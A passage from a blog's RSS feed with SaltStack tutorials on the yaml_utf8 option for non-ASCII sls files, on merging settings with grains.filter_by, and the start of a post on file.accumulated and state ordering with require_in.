&lt;p&gt;This is why most databases names will ends up as nice ascii7 names with spaces replaced by underscores, and most of the filesystem files follows the same rules.&lt;/p&gt;

&lt;p&gt;But we are not anymore in the 60s. Every filesystem allows for utf-8 in file names, even the databases -- on a next post we'll show how salt mysql module has been improved to allow almost any character combination --. So salt-stack should support this fact.&lt;/p&gt;

&lt;p&gt;But you may wonder why your salt-stack installation should support 'strange' characters?
You should take care of that because you usually provide states that you have tested with very simple hello-world level tests. And as a nice and polite computer guy, you did not add any nasty characters in your tests.
And your sls files may contain jinja variables, which may be used with data coming from external sources. You may even have a full PaaS or SaaS system running. And sooner or later you will have a user that will feed an input field with something like a company name. This company name will contain spaces and maybe Korean characters... This user entry will maybe end up in a configuration file's name, in a database's name, in a managed file's content. Chances are great that some of &lt;strong&gt;theses strange characters will end up somewhere in your salt's sls files&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;The &lt;a href=&quot;http://docs.saltstack.com/ref/configuration/master.html#yaml-utf8&quot;&gt;new yaml_utf8 option&lt;/a&gt; should be enabled on your salt-stack installation to manage these cases. This is not activated by default, it's a new option, and is waiting for some positive and negative feedbacks (use &lt;a href=&quot;https://github.com/saltstack/salt/pull/9053&quot;&gt;this github pull request&lt;/a&gt; for example, or make new issues). So feel free to experiment.&lt;/p&gt;

&lt;p&gt;Let's see why you need it and what this option is really doing.&lt;/p&gt;

&lt;h2&gt;See it in action&lt;/h2&gt;

&lt;p&gt;What happens if my yaml sls file contains some utf-8 characters? Well, bad things :-).&lt;/p&gt;

&lt;p&gt;Let's try it. We'll make a very simple state, doing some echo, and we'll do that in a &lt;code&gt;testchar.sls&lt;/code&gt; file on the salt tree root.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# -*- coding: utf-8 -*-
test-characters:
  cmd.run:
    - name: echo &quot;¿Me pones un café, por favor?&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;You can see the python utf-8 markers on the top of the sls file, this makes sure that the characters in this sls file are valid utf-8 characters. Two characters here are not in ascii7 &lt;code&gt;¿&lt;/code&gt; and &lt;code&gt;é&lt;/code&gt;. Let's now run this single state:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#$ salt-call state.sls testchar
[ERROR   ] An un-handled exception was caught by salt's global exception handler:
UnicodeEncodeError: 'ascii' codec can't encode character u'\xbf' in position 6: ordinal not in range(128)
Traceback (most recent call last):
  File &quot;/usr/local/bin/salt-call&quot;, line 44, in &amp;lt;module&amp;gt;
    sys.exit(salt.scripts.salt_call())
  File &quot;/usr/local/salt/scripts.py&quot;, line 82, in salt_call
    client.run()
  File &quot;/usr/local/salt/cli/__init__.py&quot;, line 314, in run
    caller.run()
  File &quot;/usr/local/salt/cli/caller.py&quot;, line 142, in run
    ret = self.call()
  File &quot;/usr/local/salt/cli/caller.py&quot;, line 80, in call
    ret['return'] = func(*args, **kwargs)
  File &quot;/usr/local/salt/modules/state.py&quot;, line 383, in sls
    ret = st_.state.call_high(high_)
  File &quot;/usr/local/salt/state.py&quot;, line 1701, in call_high
    chunks = self.compile_high_data(high)
  File &quot;/usr/local/salt/state.py&quot;, line 976, in compile_high_data
    chunks = self.order_chunks(chunks)
  File &quot;/usr/local/salt/state.py&quot;, line 920, in order_chunks
    chunks.sort(key=lambda k: (k['order'], '{0[state]}{0[name]}{0[fun]}'.format(k)))
  File &quot;/usr/local/salt/state.py&quot;, line 920, in &amp;lt;lambda&amp;gt;
    chunks.sort(key=lambda k: (k['order'], '{0[state]}{0[name]}{0[fun]}'.format(k)))
UnicodeEncodeError: 'ascii' codec can't encode character u'\xbf' in position 6: ordinal not in range(128)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ouch.&lt;/p&gt;

&lt;p&gt;Now let's find the &lt;code&gt;yaml_utf8&lt;/code&gt; option in your master salt configuration file, for me it was in &lt;code&gt;/etc/salt/master.d/00_global.conf&lt;/code&gt;, and set it to True. Then restart the master and test again:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#$ service salt-master restart
salt-master stop/waiting
salt-master start/running, process 5471
#$ salt-call state.sls testchar
local:
----------
          ID: test-characters
    Function: cmd.run
        Name: echo &quot;¿Me pones un café, por favor?&quot;
      Result: True
     Comment: Command &quot;echo &quot;¿Me pones un café, por favor?&quot;&quot; run
     Changes:   
              ----------
              pid:
                  5053
              retcode:
                  0
              stderr:

              stdout:
                  ¿Me pones un café, por favor?

Summary
------------
Succeeded: 1
Failed:    0
------------
Total:     1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Great.&lt;/p&gt;

&lt;p&gt;Note that the main problem here, in the first example, was that special characters were used on the state &lt;strong&gt;name&lt;/strong&gt;. But it could also happen with harmless attributes. Let's try with a &lt;strong&gt;text&lt;/strong&gt; attribute, and without the &lt;code&gt;yaml_utf8&lt;/code&gt; option set:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# -*- coding: utf-8 -*-
test-characters1:
  file.touch:
    - name: /tmp/foobar
test-characters2:
  file.append:
    - name: /tmp/foobar
    - text: &quot;¿Me pones un café, por favor?&quot;
    - require:
      - file: test-characters1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It will also fail:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#$ salt-call state.sls testch
local:
----------
          ID: test-characters1
    Function: file.touch
        Name: /tmp/foobar
      Result: True
     Comment: Updated times on file /tmp/foobar
     Changes:   
----------
          ID: test-characters2
    Function: file.append
        Name: /tmp/foobar
      Result: False
     Comment: An exception occurred in this state: Traceback (most recent call last):
                File &quot;/usr/local/salt/state.py&quot;, line 1370, in call
                  **cdata['kwargs'])
                File &quot;/usr/local/salt/states/file.py&quot;, line 2519, in append
                  name, salt.utils.build_whitespace_split_regex(chunk)):
                File &quot;/usr/local/salt/utils/__init__.py&quot;, line 772, in     build_whitespace_split_regex
                  parts = [re.escape(s) for s in __build_parts(line)]
                File &quot;/usr/local/salt/utils/__init__.py&quot;, line 761, in     __build_parts
                  lexer = shlex.shlex(text)
                File &quot;/usr/lib/python2.7/shlex.py&quot;, line 25, in __init__
                  instream = StringIO(instream)
              UnicodeEncodeError: 'ascii' codec can't encode character u'\xbf' in position 0: ordinal not in range(128)
     Changes:   

Summary
------------
Succeeded: 1
Failed:    1
------------
Total:     2
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;But here, at least, you have a catched exception.&lt;/p&gt;

&lt;p&gt;Obviously, after using the &lt;code&gt;yaml_utf8&lt;/code&gt; option this state will work.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;local:
----------
          ID: test-characters1
    Function: file.touch
        Name: /tmp/foobar
      Result: True
     Comment: Updated times on file /tmp/foobar
     Changes:   
----------
          ID: test-characters2
    Function: file.append
        Name: /tmp/foobar
      Result: True
     Comment: Appended 1 lines
     Changes:   
              ----------
              diff:
                  --- 
                  +++ 
                  @@ -0,0 +1 @@
                  +¿Me pones un café, por favor?
Summary
------------
Succeeded: 2
Failed:    0
------------
Total:     2
&lt;/code&gt;&lt;/pre&gt;

&lt;h2&gt;What happened exactly?&lt;/h2&gt;

&lt;p&gt;If you want to understand this better I'll give some details. You do not need to understand the details, but it could be useful, especially if you are american (or part of the subset of humanity using pounds, miles and ascii7).&lt;/p&gt;

&lt;p&gt;The error was there:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;  File &quot;/usr/local/salt/state.py&quot;, line 920, in &amp;lt;lambda&amp;gt;
    chunks.sort(key=lambda k: (k['order'], '{0[state]}{0[name]}{0[fun]}'.format(k)))
UnicodeEncodeError: 'ascii' codec can't encode character u'\xbf' in position 6: ordinal not in range(128)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Salt is ordering the states and the states' name are used to do the sorting. Here we have special characters on these names and the sort method emits an uncatched exception.&lt;/p&gt;

&lt;p&gt;A fix would be replacing &lt;code&gt;'{0[state]}{0[name]}{0[fun]}'&lt;/code&gt; with &lt;code&gt;u'{0[state]}{0[name]}{0[fun]}'&lt;/code&gt;. But you would need this sort of fix in a thousand places. You would have to fix pretty much every string in salt :-(&lt;/p&gt;

&lt;p&gt;By default, with python 2.x, there are two types of string objects:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;str : the default string object, allow utf-8 encoded strings (a byte string)&lt;/li&gt;
&lt;li&gt;unicode : an unicode string&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;An example is worth a thousand words:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#$ python
&amp;gt;&amp;gt;&amp;gt; foo=&quot;foo&quot;
&amp;gt;&amp;gt;&amp;gt; foo
'foo'
&amp;gt;&amp;gt;&amp;gt; type(foo)
&amp;lt;type 'str'&amp;gt;
&amp;gt;&amp;gt;&amp;gt; bar=&quot;準&quot;
&amp;gt;&amp;gt;&amp;gt; bar
'\xe6\xba\x96'
&amp;gt;&amp;gt;&amp;gt; type(bar)
&amp;lt;type 'str'&amp;gt;
&amp;gt;&amp;gt;&amp;gt; baz=u&quot;準&quot;
&amp;gt;&amp;gt;&amp;gt; baz
u'\u6e96'
&amp;gt;&amp;gt;&amp;gt; type(baz)
&amp;lt;type 'unicode'&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So the special character &lt;code&gt;準&lt;/code&gt; is &lt;code&gt;\xe6\xba\x96&lt;/code&gt; in utf-8 encoding and &lt;code&gt;\u6e96&lt;/code&gt; in unicode encoding. Unicode and utf-8 are not the same things. And by default string objects are utf-8 encoded strings.&lt;/p&gt;

&lt;p&gt;The funny thing is that this is not the case in python 3.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#$ /usr/bin/python3.2
&amp;gt;&amp;gt;&amp;gt; foo=&quot;foo&quot;
&amp;gt;&amp;gt;&amp;gt; foo
'foo'
&amp;gt;&amp;gt;&amp;gt; type(foo)
&amp;lt;class 'str'&amp;gt;
&amp;gt;&amp;gt;&amp;gt; bar=&quot;準&quot;
&amp;gt;&amp;gt;&amp;gt; bar
'準'
&amp;gt;&amp;gt;&amp;gt; type(bar)
&amp;lt;class 'str'&amp;gt;
&amp;gt;&amp;gt;&amp;gt; baz=bar.encode('utf-8')
&amp;gt;&amp;gt;&amp;gt; baz
b'\xe6\xba\x96'
&amp;gt;&amp;gt;&amp;gt; type(baz)
&amp;lt;class 'bytes'&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In python3 the default string class will be unicode (as if you had prefixed all your python2 string with &lt;code&gt;u&lt;/code&gt;), and the old python default str type will be the byte string class. You will need to prefix with &lt;code&gt;b&lt;/code&gt; to get that sort of utf-8 encoded strings.&lt;/p&gt;

&lt;p&gt;You can find a very detailled explanation on &lt;a href=&quot;http://docs.python.org/3.3/howto/unicode.html&quot;&gt;python's unicode documentation&lt;/a&gt; and on &lt;a href=&quot;http://wolfprojects.altervista.org/talks/unicode-and-python-3/&quot;&gt;this slide explaining the difference of string encoding in python2 and 3&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Talking about &lt;strong&gt;&lt;a href=&quot;http://www.saltstack.com/&quot;&gt;Salt-stack&lt;/a&gt;&lt;/strong&gt; we are working in a python2 world. And in pretty every string usage inside salt-stack default strings are used, so byte strings, allowing utf-8 encoding but not unicode. This should allow every special character, if they are well transformed to an utf-8 encoded string. If our special string is managed in this form:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;'\xc2\xbfMe pones un caf\xc3\xa9, por favor?'
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Everything should be fine.&lt;/p&gt;

&lt;p&gt;The problem comes from the sls yaml transcription. Salt works with low states, highstates, etc. This is generated from the sls files with a yaml transcription. And this task is made by a yaml library.&lt;/p&gt;

&lt;p&gt;This &lt;strong&gt;yaml parser library&lt;/strong&gt; is python3-ready, and the result of the yaml parsing is always &lt;strong&gt;unicode strings&lt;/strong&gt; if special characters are encountered, not str default strings. So as soon as you have a special character in the sls salt receive unicode u'foo' strings while everything is made to handle utf-8 encoded strings. This yaml_utf8 option is there to ensure that after the yaml load is made, every unicode string is decoded to utf-8, you can see it in the code &lt;a href=&quot;https://github.com/saltstack/salt/blob/2014.1/salt/renderers/yaml.py#L70-92&quot;&gt;right here&lt;/a&gt;.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://twitter.com/regilero&quot;&gt;Stay tuned on twitter, @regilero&lt;/a&gt;, &lt;a href=&quot;https://twitter.com/makinacorpus&quot;&gt;@makinacorpus&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
				<published>2014-02-05 00:00:00 +0100</published>
				<link>http://regilero.github.io/saltstack/english/2014/02/05/saltstack-use-more-than-ascii7-on-sls-files-with-yaml_utf8-option/</link>
			</item>
		
			<item>
				<title>SaltStack, Merge dictionaries of settings with grains.filter_by</title>
				<description>&lt;p&gt;If you read some formulas you may have noticed a nice way of managing settings. The &lt;a href=&quot;http://docs.saltstack.com/ref/modules/all/salt.modules.grains.html#salt.modules.grains.filter_by&quot;&gt;&lt;code&gt;grains.filter_by&lt;/code&gt;&lt;/a&gt; function. Values used in salt states are usually dynamic, coming from grains, from the pillar, from variations depending on the host environment. When you have a big number of variables using only the default jinja tools is sometimes frustrating. This is a must-know feature.&lt;/p&gt;

&lt;p&gt;There's a nice example in &lt;a href=&quot;https://github.com/saltstack-formulas/apache-formula/blob/master/apache/map.jinja&quot;&gt;the Apache formula map.jinja file&lt;/a&gt;, which may evolve, so let's show what it looks like:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;{% set apache = salt['grains.filter_by']({
    'Debian': {
        'server': 'apache2',
        'service': 'apache2',

        'mod_wsgi': 'libapache2-mod-wsgi',

        'vhostdir': '/etc/apache2/sites-available',
        'confdir': '/etc/apache2/conf.d',
        'logdir': '/var/log/apache2',
        'wwwdir': '/srv',
    },
    'RedHat': {
        'server': 'httpd',
        'service': 'httpd',

        'mod_wsgi': 'mod_wsgi',

        'vhostdir': '/etc/httpd/conf.d',
        'confdir': '/etc/httpd/conf.d',
        'logdir': '/var/log/httpd',
        'wwwdir': '/var/www',
    },
}, merge=salt['pillar.get']('apache:lookup')) %}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This sets an &lt;code&gt;apache&lt;/code&gt; jinja variable, a dictionary containing &lt;code&gt;server&lt;/code&gt;, &lt;code&gt;service&lt;/code&gt;,&lt;code&gt;confdir&lt;/code&gt; or &lt;code&gt;wwwdir&lt;/code&gt; keys (and some more).&lt;/p&gt;

&lt;p&gt;The main idea of &lt;code&gt;salt['grains.filter_by']&lt;/code&gt; is to filter a settings dictionary based on a grain: &lt;strong&gt;os_family&lt;/strong&gt; (here the value may be 'Redhat' or 'Debian').&lt;/p&gt;

&lt;p&gt;Usage of this &lt;code&gt;map.jinja&lt;/code&gt; file can be &lt;a href=&quot;https://github.com/saltstack-formulas/apache-formula/blob/master/apache/init.sls&quot;&gt;seen on the init.sls&lt;/a&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;{% from &quot;apache/map.jinja&quot; import apache with context %}

apache:
  pkg:
    - installed
    - name: {{ apache.server }}
(...)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now if you have a pretty recent version (&gt; 0.17.2) of Salt-stack this &lt;a href=&quot;http://docs.saltstack.com/ref/modules/all/salt.modules.grains.html#salt.modules.grains.filter_by&quot;&gt;&lt;code&gt;filter_by&lt;/code&gt;&lt;/a&gt; function has some new very interesting features.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;salt.modules.grains.filter_by(lookup_dict, grain='os_family', merge=None, default='default')
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;the &lt;strong&gt;lookup dict&lt;/strong&gt; is your dictionary of settings where you want a filter to be applied, so at the end you will obtain a subtree of this dictionary.&lt;/li&gt;
&lt;li&gt;the &lt;strong&gt;grain&lt;/strong&gt; is by default the &lt;em&gt;os_family&lt;/em&gt; grain, but you can use any defined grain key (&lt;code&gt;salt-call grains.items&lt;/code&gt; to see them).&lt;/li&gt;
&lt;li&gt;the &lt;strong&gt;merge&lt;/strong&gt; argument lets you merge another dictionary on top of the end result, this is very useful, as seen on the apache's formula, to retrieve pillar data overriding the default settings dictionary.&lt;/li&gt;
&lt;li&gt;and the new argument is &lt;strong&gt;default&lt;/strong&gt;, which lets you specify which key of the &lt;em&gt;lookup dict&lt;/em&gt; should be used if you did not have the requested grain or if the requested grain value is not present in this &lt;em&gt;lookup dict&lt;/em&gt;.&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;So this function is now a really good shortcut for a default settings registry mapping.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;{% set settings = salt['grains.filter_by']({
    'unset': { 'foo': 'The coconut's tropical', 'bar': 'King Arthur'},
    'prod': { 'foo': 'Bridgekeeper', 'bar': 'We want a shrubbery' },
    'preprod': { 'foo': 'Sir Lancelot', bar: 'Blue. No, yel…'},
  },
  grain='my_env',
  merge=salt['pillar.get']('apache:lookup')),
  default='unset' 
%}
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://twitter.com/regilero&quot;&gt;Stay tuned on twitter, @regilero&lt;/a&gt;, &lt;a href=&quot;https://twitter.com/makinacorpus&quot;&gt;@makinacorpus&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
				<published>2014-01-28 00:00:00 +0100</published>
				<link>http://regilero.github.io/saltstack/english/2014/01/28/saltstack_merge_dictionaries_of_settings_with_grains_filter_by/</link>
			</item>
		
			<item>
				<title>SaltStack, Use file.accumulated accumulators with file.managed and file.blockreplace</title>
				<description>&lt;p&gt;&lt;a href=&quot;/saltstack/english/2014/01/20/saltstack_step_by_step_file_blockreplace/&quot;&gt;On the last salt-stack post&lt;/a&gt; we saw a first step by step usage of &lt;a href=&quot;http://docs.saltstack.com/ref/states/all/salt.states.file.html#salt.states.file.blockreplace&quot;&gt;&lt;code&gt;file.blockreplace&lt;/code&gt;&lt;/a&gt;. On this post we'll study usage of state accumulators with &lt;a href=&quot;http://docs.saltstack.com/ref/states/all/salt.states.file.html#salt.states.file.accumulated&quot;&gt;&lt;code&gt;file.accumulated&lt;/code&gt;&lt;/a&gt;. Accumulators are used to collect data on several states and let you use this data on other file states (Actually only the blockreplace and managed states).&lt;/p&gt;

&lt;p&gt;You can find the examples used on this post on &lt;a href=&quot;https://github.com/regilero/regilero-blog-examples/tree/master/accumulated-blockreplace&quot;&gt;this github repository&lt;/a&gt;.&lt;/p&gt;

&lt;h2&gt;Why using accumulated accumulators?&lt;/h2&gt;

&lt;p&gt;Let's start by the needs. What sort of problems could be solved by accumulators?. In fact, the idea is to use states executed before a final state. And this state ordering can be solved using requisites or orders. On theses first states you &lt;strong&gt;collect data&lt;/strong&gt; for later usage. Then, on the final state, you have a dictionary containing this collected data, the &lt;em&gt;accumulator&lt;/em&gt; dictionary, and you can do what you want with it with jinja, or even without jinja in the blockreplace case. Note that you only collect data in the current highstate execution, so all accumulators must run (be included) if you need the data at the end.&lt;/p&gt;

&lt;p&gt;You can use this system to record one or more lists of things likes users, services, addresses, configuration commands or wathever else you want, while running the states. And all theses states recording data will have to run before the one using that data for something (writing theses lists on a targeted file). Doing that you will avoid doing the write operation after each new record, you will wait for the final list before doing the write. This will be faster, but also easier to manage. Inserting, updating and removing data in a file, in one shot.&lt;/p&gt;

&lt;p&gt;In this post I will use two examples, one for a managed file and one for a blockreplace edited file. The first example is an apache configuration file with several states adding some inputs inside. The second example will fill a list of DNS IP-name associations that should be added in a hosts file.&lt;/p&gt;

&lt;h2&gt;States ordering&lt;/h2&gt;

&lt;p&gt;As I said before states ordering is very important here. The final step must be final. And used states may be split upon several sls files. You can use the order &lt;code&gt;order&lt;/code&gt; keyword to ensure the final order, this way:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-yaml&quot; data-lang=&quot;yaml&quot;&gt;&lt;span class=&quot;lineno&quot;&gt; 1&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# first.sls&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 2&lt;/span&gt;     &lt;span class=&quot;l-Scalar-Plain&quot;&gt;STATEID1&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 3&lt;/span&gt;       &lt;span class=&quot;l-Scalar-Plain&quot;&gt;cmd.run&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 4&lt;/span&gt;         &lt;span class=&quot;l-Scalar-Plain&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;echo STATEID1&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 5&lt;/span&gt;         &lt;span class=&quot;l-Scalar-Plain&quot;&gt;order&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;100&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 6&lt;/span&gt;     
&lt;span class=&quot;lineno&quot;&gt; 7&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;# second.sls&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 8&lt;/span&gt;     &lt;span class=&quot;l-Scalar-Plain&quot;&gt;STATEID2&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 9&lt;/span&gt;       &lt;span class=&quot;l-Scalar-Plain&quot;&gt;cmd.run&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;10&lt;/span&gt;         &lt;span class=&quot;l-Scalar-Plain&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;echo last&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;11&lt;/span&gt;         &lt;span class=&quot;l-Scalar-Plain&quot;&gt;order&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;900&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;12&lt;/span&gt;     
&lt;span class=&quot;lineno&quot;&gt;13&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;# third sls&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;14&lt;/span&gt;     &lt;span class=&quot;l-Scalar-Plain&quot;&gt;STATEID3&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;15&lt;/span&gt;       &lt;span class=&quot;l-Scalar-Plain&quot;&gt;cmd.run&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;16&lt;/span&gt;         &lt;span class=&quot;l-Scalar-Plain&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;echo STATEID3&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;17&lt;/span&gt;         &lt;span class=&quot;l-Scalar-Plain&quot;&gt;order&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;200&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This will make a final execution order of:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-yaml&quot; data-lang=&quot;yaml&quot;&gt;&lt;span class=&quot;lineno&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;echo STATEID1&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;2&lt;/span&gt;     &lt;span class=&quot;l-Scalar-Plain&quot;&gt;echo STATEID3&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;3&lt;/span&gt;     &lt;span class=&quot;l-Scalar-Plain&quot;&gt;echo last&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;But to do that you need an ordering schema for all you states. I do not find that very useful when you have a lot of states.&lt;/p&gt;

&lt;p&gt;The second way of ordering states is using &lt;a href=&quot;http://docs.saltstack.com/ref/states/requisites.html&quot;&gt;&lt;code&gt;requisites&lt;/code&gt;&lt;/a&gt;. Using this method you can declare dependencies between states. But having a list of all the states that collects data into accumulators, and eediting this list on the state using the accumulator would be quite hard. The best thing here is to use the &lt;code&gt;*_in&lt;/code&gt; form of the requisites, to declare the dependency from the dependent state. When adding a new state using the accumulator the dependency will have to be set in this state and not in the previous managed state entry.&lt;/p&gt;

&lt;p&gt;So using &lt;code&gt;require_in&lt;/code&gt; the previous example would be:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-yaml&quot; data-lang=&quot;yaml&quot;&gt;&lt;span class=&quot;lineno&quot;&gt; 1&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# first.sls&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 2&lt;/span&gt;     &lt;span class=&quot;l-Scalar-Plain&quot;&gt;STATEID1&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 3&lt;/span&gt;       &lt;span class=&quot;l-Scalar-Plain&quot;&gt;cmd.run&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 4&lt;/span&gt;         &lt;span class=&quot;l-Scalar-Plain&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;echo STATEID1&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 5&lt;/span&gt;         &lt;span class=&quot;l-Scalar-Plain&quot;&gt;require_in&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 6&lt;/span&gt;           &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;STATEID2&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 7&lt;/span&gt;     
&lt;span class=&quot;lineno&quot;&gt; 8&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;# second.sls&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 9&lt;/span&gt;     &lt;span class=&quot;l-Scalar-Plain&quot;&gt;STATEID2&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;10&lt;/span&gt;       &lt;span class=&quot;l-Scalar-Plain&quot;&gt;cmd.run&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;11&lt;/span&gt;         &lt;span class=&quot;l-Scalar-Plain&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;echo last&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;12&lt;/span&gt;     
&lt;span class=&quot;lineno&quot;&gt;13&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;# third sls&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;14&lt;/span&gt;     &lt;span class=&quot;l-Scalar-Plain&quot;&gt;STATEID3&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;15&lt;/span&gt;       &lt;span class=&quot;l-Scalar-Plain&quot;&gt;cmd.run&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;16&lt;/span&gt;         &lt;span class=&quot;l-Scalar-Plain&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;echo STATEID3&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;17&lt;/span&gt;         &lt;span class=&quot;l-Scalar-Plain&quot;&gt;require_in&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;18&lt;/span&gt;           &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;STATEID2&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;Be careful:&lt;/strong&gt; the syntax for a requisite is:&lt;/p&gt;

